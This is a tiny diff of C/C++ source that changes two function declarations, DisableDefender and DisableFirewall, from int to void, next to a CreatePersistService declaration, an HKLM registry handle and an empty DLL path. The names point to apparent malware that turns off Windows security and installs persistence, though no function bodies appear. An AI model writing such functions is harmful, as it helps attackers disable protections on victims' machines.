@@ -14,6 +14,6 @@
 HKEY HKLM = HKEY_LOCAL_MACHINE;
 LPCSTR dllPath = "";
 
-int DisableDefender();
-int DisableFirewall();
+void DisableDefender();
+void DisableFirewall();
 int CreatePersistService();
